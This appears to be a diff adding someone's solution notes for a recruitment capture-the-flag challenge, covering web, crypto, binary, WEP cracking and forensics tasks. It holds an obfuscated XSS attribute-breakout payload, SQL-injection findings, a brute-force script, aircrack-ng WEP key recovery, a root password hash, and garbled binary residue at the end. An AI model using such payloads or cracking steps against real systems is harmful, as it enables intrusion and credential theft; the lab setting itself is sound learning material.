@@ -1,0 +1,162 @@
+==========
+
+Web Application:
+
+1 XSS Breakout:
+
+xss_breakout.php?name=yeah' onfocus='[][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]][([][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]])[%2b!%2b[]%2b[%2b[]]]%2b([][[]]%2b[])[%2b!%2b[]]%2b(![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[%2b!%2b[]]%2b([][[]]%2b[])[%2b[]]%2b([][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]])[%2b!%2b[]%2b[%2b[]]]%2b(!![]%2b[])[%2b!%2b[]]]((![]%2b[])[%2b!%2b[]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(![]%2b[][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]])[!%2b[]%2b!%2b[]%2b[%2b[]]]%2b[%2b!%2b[]]%2b(!![]%2b[][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]])[!%2b[]%2b!%2b[]%2b[%2b[]]])()' autofocus='
+
+2 Password Reset:
+$_GET['name'] is vulnerable to sequel injection.
+3 PHP Source Code Review
+view.php is vulnerable to sequel injection.
+if (isset($_GET["id"]) && is_numeric($_GET["id"])) {
+
+==========
+
+Crypto:
+1: Hence! Home, you idle creatures get you home!
+Is this a holiday? What, know you not,
+Being mechanical, you ought not walk
+Upon a laboring day without the sign
+Of your profession? Speak, what trade art thou?
+- Shakespear
+contextis{mlrUcniUc9dlZhl9dr4c8qifh0Z3nj0VUqTYW0so,talent@ctx.is}
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+hijklmnopqrstuvwxyzabcdefg
+
+2: I was not able to complete it but I have noticed that each character is ROT13, approx:
+contextis
+fRBHvXdmQ
+careers@contextis.com
+MEUhSfj@cyRrgXgwh.Gbm
+ABCDEFGHIJKLMNOPQRSTUVWXYZ c
+klmnopqrstuvwxyzabcdefghij
+ABCDEFGHIJKLMNOPQRSTUVWXYZ a
+efghijklmnopqrstuvwxyzabcd
+ABCDEFGHIJKLMNOPQRSTUVWXYZ re co
+defghijklmnopqrstuvwxyzabc
+ABCDEFGHIJKLMNOPQRSTUVWXYZ er nt
+opqrstuvwxyzabcdefghijklmn
+ABCDEFGHIJKLMNOPQRSTUVWXYZ s e
+rstuvwxyzabcdefghijklmnopq
+ABCDEFGHIJKLMNOPQRSTUVWXYZ c x
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+ABCDEFGHIJKLMNOPQRSTUVWXYZ o t
+klmnopqrstuvwxyzabcdefghij
+ABCDEFGHIJKLMNOPQRSTUVWXYZ n i
+efghijklmnopqrstuvwxyzabcd
+ABCDEFGHIJKLMNOPQRSTUVWXYZ t s
+yzabcdefghijklmnopqrstuvwx
+ABCDEFGHIJKLMNOPQRSTUVWXYZ e
+cdefghijklmnopqrstuvwxyzab
+ABCDEFGHIJKLMNOPQRSTUVWXYZ x
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+ABCDEFGHIJKLMNOPQRSTUVWXYZ t
+nopqrstuvwxyzabcdefghijklm
+ABCDEFGHIJKLMNOPQRSTUVWXYZ i
+opqrstuvwxyzabcdefghijklmn
+ABCDEFGHIJKLMNOPQRSTUVWXYZ s
+pqrstuvwxyzabcdefghijklmno
+ABCDEFGHIJKLMNOPQRSTUVWXYZ c
+wxyzabcdefghijklmnopqrstuv
+ABCDEFGHIJKLMNOPQRSTUVWXYZ o
+nopqrstuvwxyzabcdefghijklm
+ABCDEFGHIJKLMNOPQRSTUVWXYZ m
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+
+==========
+
+Binary:
+video: brute forcing
+unzip file
+less reversing-chal01.base64
+cat reversing-chal01.base64|base64 --decode > decoded-reversing
+file decoded-reversing PE32 executable (console) Intel 80386, mv decoded-reversing decoded-reversing.exe
+bash script used to brute-force binary:
+
+#!/bin/bash
+cnt=0
+FILE=results
+while [ 1 -eq 1 ]; do
+ for i in {0..14}; do
+   for j in {0..14}; do
+     for k in {0..14}; do
+       $(echo -ne '\n\n\n\n\n' "$i" '\n' "$j" '\n' "$k" '\n\n' | wine decoded-reversing.exe > "$FILE")
+       cat "$FILE"
+       if ! grep -q 'no Flag for you!' "$FILE"; then
+         exit
+       fi
+       cnt=$(($cnt+1)); echo "$cnt"
+     done
+   done
+ done
+done
+
+Flag: K3epOnMoving
+
+==========
+
+Wireless:
+WEP trace:
+unzip file
+export monitored.pcapng to monitored.pcap with wireshark
+bssid: 00:1f:1f:26:12:d8 essid: EdimaxTe_26:12:d8
+aircrack-ng -b 00:1f:1f:26:12:d8 monitored.pcap
+WEP key found: DE:AD:BE:EF:01
+airdecap-ng -w DE:AD:BE:EF:01 monitored.pcap shows decrypted traffic
+load monitored-dec.pcap into wireshark and 'follow TCP stream':
+ - username=Admin&password=CONTEXTIS%7Ba9a2eeb4b29a95ca4d98d45b4d90d661a6f35483605d6a1231084ff7d2336e1e%2Ctalent%40ctx.is%7D
+{a9a2eeb4b29a95ca4d98d45b4d90d661a6f35483605d6a1231084ff7d2336e1e,talent@ctx.is}
+RFID Signal Trace:
+I was not able to extract the sha256 from the waveform, I have tried to convert the signal into binary and see if I could get the 32 bytes key.
+
+==========
+
+Forensic1:
+
+unzip file
+less 0.2
+remove carriage return, linefeed: tr '\r\n' < 0.2 > 0-2-no-car
+decode base64 string: cat 0-2-no-car|base64 --decode > decoded-0-2
+file decoded-0-2 is a zip, mv decoded-0-2 decoded-0-2.zip
+unzip file
+file 0 is a qemu img, mv 0 0.img
+mount img with libguestfs-tools:
+ - sudo modprobe nbd max_part=63
+ - sudo qemu-nbd -c /dev/nbd0 0.img
+ - sudo mount /dev/nbdp1 p1
+ - sudo chroot p1 bash
+ - # su -
+ - # chmod 777 Untitled.dib; cp Untitled.dib /home
+ - # exit; exit
+ - cp p1/home/Untitled.dib .
+ - file Untitled.dib is a windows 3.x bitmap
+ 
+ Flag: CfxXM2mhqPeHSIjpKTV
+
+Forensic2:
+file found: cracked.csv - F0:7D:68:67:67:75,WEP,SKY72615,7CC5DBB40A,False
+I was not able to find the AES key to decrypt files encrypted with TrueCrypt. I have tried with bulk_extractor, binwalk, strings, md5deep <- to check for md5, autopsy, aeskeyfind, volatility.
+
+root:$6$bpWNT25M$6/r.d4a4G/wQX3/eSbBiTQluVQpmPSmAKvk0r5kS/LY7HS88.StLG06.3gR2rKXGXYryAjosq49ZJA
+
+sha256:12288cd41a527f9758ffc16768830d8403eca2a75d948c2f0f37e9d8a14ddff9
+
+sha256:803ce7aee90db6674b1e9dc3ac587ec7ba9cfc49904c0bacf272402efed2d
+
+sha256:4f90073f4df7e7c1103fb5541c8c6f43510236d5f2da9cbe85cc67ef9f0db7da
+
+sha256:b9a85738553caadb7bf6d81f58ae88c04217935f91f6752dbaa68f0a020ccafc
+
+md5: 3103d73a08a367ea05363dfe727
+
+xfce4-session
+
+1 #@ 2d6ec41db-291a-4185-8bf2-e0142d7d1813
+
+passwdrotocolublickeyservic725899c60bd030f11a56ed4c5d02d981
+
+[K^CDesktop/secret.txtd27a0l02bV1uahFX6covGkTdKR6Li5BK
+
+secret.txttext-,`/@3@BmQq;'6g?\S[{;q||7;|4c;V]U=OFM;UVUw7"b=OSL#;0e0?T{5??-c;,=c~@?$`@?8c~A?q~B?|~C?x$[~D?D1~E?10n7F?Rm;pkUQv}I?` B}J?J?OY}K?0F;Ia}8S^|N?b |O?F*=P?x6i}P?_=Q?oQ??.cU1dfyx^f=R?>4T}R?R=S?}I}S?J&7o^;>BP3|T?Ey<U?Nd|U?O"<V?{9i;X?P{X?u;Y?[0:Z?2zZ?y4:[?,$#pyy\?}R9]?25y]?[)>RZa8_?Bx_?q`?D0[`?va?gJk[;a?k$J[a?8BM}P8{a?*F@a?YV(;[ Fa?{[a}{_:b?SZb?KDS8:c?8!   <S$Zc?zc?6BE*yyYd?\qyd?vd?6)d?WBd?OG8e?F8U1lXe?LTG8f?c1Xf?f?A7h<<,[a#Q<13wR
